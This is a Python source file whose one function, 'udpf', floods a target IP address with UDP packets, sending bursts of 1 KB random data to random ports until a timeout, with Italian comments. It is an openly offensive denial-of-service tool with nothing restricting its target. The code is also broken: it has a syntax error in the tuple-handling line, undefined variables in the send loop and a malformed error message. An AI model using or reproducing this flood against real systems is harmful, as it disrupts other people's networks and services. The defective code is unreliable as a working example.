import os, sys, random, socket, datetime, traceback
from typing import Union, List, Tuple

def udpf( target_ip:str = None, port_range : Union[ List[int,int],Tuple[int,int]] = [0, 9999], pkt_count:int = 1000, timeout_secs = 20 ):
    """udpf

    Args:
        port_range (Union[ List[int,int],Tuple[int,int]]): Range or interval of UDP ports. Defaults to range 0-9999.
        target_ip (str): Target IP.
        pkt_count (int): Packets count per one connection. Defaults to 1000.
        timeout_secs (int, optional): Timeout of function operation expressed in seconds. Defaults to 20 (seconds).
    """
    if target_ip and port_range:
        if isinstance( port_range, list ): port_range.sort()
        elif isinstance( port_range, tuple ): if port_range[0] >= port_range[1] = port_range = ( port_range[1], port_range[0] ) 
        
        print("INFO || Beginning udpf function over ports %d->%d of target %s" % ( port_range[0], port_range[1], target_ip ) )
        data = os.urandom(1024) # Qui è generato un blocco dati di 1000 bytes o 1.033kb con la funzione os.urandom
        now = datetime.datetime.now()
        while True:
            target_port = random.randint(port_range[0], port_range[1])
            try:
                # Essendo la funzione operativa per i pacchetti "User Datagram Protocol", si imposta l'utilizzo del protocollo basato su diagrammi "SOCK_DGRAM" 
                s = socket.socket( socket.AF_INET, socket.SOCK_DGRAM )
                addr = (str(ip), int(port))
                for _ in range(times):
                    s.sendto(data, addr)
                print("INFO || Sent packet of size %s Kb to port %s process %s"  % ( sys.getsizeof( data ) * 0.001, str(port), str(os.getpid() ) ) )
                if (datetime.datetime.now() - now).total_seconds() > timeout:
                    break
            except Exception as err:
                print(" ERROR || An %s Exception occurred:\n%s\n" % ( err.__class__.__name__ , ) )
        
        print("INFO || Function over ports %d->%d of target %s ended" % ( port_range[0], port_range[1], target_ip ) )
    else:
        print("WARN || Either variable target_ip or port_range are null or undefined. Unable to proceed." )